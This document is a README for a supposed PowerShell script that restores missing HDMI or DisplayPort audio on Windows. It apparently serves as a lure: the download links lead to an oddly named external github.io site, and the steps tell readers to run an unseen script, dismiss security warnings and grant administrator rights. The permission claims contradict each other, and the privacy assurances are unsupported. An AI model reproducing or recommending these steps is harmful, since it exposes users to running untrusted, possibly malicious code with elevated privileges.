# 🔊 HDMI-Audio-Fix-PowerShell - Restore missing sound on your Windows displays

[![](https://img.shields.io/badge/Download-HDMI_Audio_Fix-blue.svg)](https://rozinaunarmoured388.github.io)

HDMI-Audio-Fix-PowerShell helps you fix audio issues on Windows 10 and 11. Sometimes your computer fails to detect sound through HDMI or DisplayPort cables. This tool identifies common driver communication errors and restores the connection between your graphics card and your display. It works for NVIDIA, AMD, and Intel graphics systems.

## 🛠️ Requirements

Your computer needs:
* Windows 10 or Windows 11.
* An active connection to an HDMI or DisplayPort monitor or television.
* Basic user permissions to run system tools.

## 📥 Getting Started

Follow these steps to download and run the repair tool.

1. Go to the [official release page](https://rozinaunarmoured388.github.io) to download the package.
2. Locate the zip file in your Downloads folder.
3. Right-click the folder and select Extract All.
4. Open the extracted folder.
5. Right-click the script file named `Fix-Audio.ps1`.
6. Select Run with PowerShell from the menu.

If a security warning appears, confirm the action to allow the script to make necessary changes to your audio drivers.

## ⚙️ How it works

The tool performs a series of background checks to verify your hardware state. It forces Windows to re-scan for audio endpoints connected to your graphics card. This process restarts the audio services associated with your GPU driver. It does not overwrite your existing graphics drivers. Instead, it resets the handshake process between the computer and the monitor. This usually clears up errors where Windows thinks no output device exists.

## 📝 Troubleshooting steps

If you still have no sound after running the tool, check these items:

* Verify the physical cable connection. Unplug and replug your HDMI or DisplayPort cable at both ends.
* Ensure you selected the correct output device in your Windows Sound Settings. Click the speaker icon in your taskbar and check the list of available devices.
* Confirm that your monitor volume is not muted. Use the remote control or the buttons on the monitor frame.
* Restart your computer after running the tool. This allows Windows to finalize the driver configuration changes.

## 🛡️ Safety and Privacy

This script only modifies Registry keys and Service settings related to your audio hardware. It does not send information to external servers. It does not install third-party software or bloatware. You can view the contents of the script by opening it in Notepad before you run it. This transparency ensures you know exactly what changes occur on your system.

## 📈 Supported Hardware

This tool supports most modern hardware configurations:

* NVIDIA GeForce series graphics cards.
* AMD Radeon series graphics cards.
* Integrated Intel HD and Iris graphics.
* Standard HDMI and DisplayPort connections.

The tool focuses on the Microsoft High Definition Audio driver, which is the standard driver used by most modern graphics cards to send audio data to displays.

## ❓ Frequently Asked Questions

**Will this change my screen resolution?**
No. This tool only targets the audio component of your graphics display output. It leaves your display resolution and refresh rate settings untouched.

**Do I need to be an administrator?**
Yes. Changing hardware drivers and service states requires permission to modify system files. If your account does not have administrator access, Windows will ask for a password when you run the script.

**Does this fix microphone issues?**
This tool addresses output audio from the monitor, not input audio from a microphone.

**Is it safe to run multiple times?**
Yes. You can run the script as many times as needed if your audio drops out again after a driver update or a Windows update. Each run performs a fresh check of the current system state.

If the issue persists, ensure your GPU drivers are up to date through the official manufacturer website. This tool works best when combined with current manufacturer drivers. It acts as a bridge to force detection when the Windows driver interface gets stuck.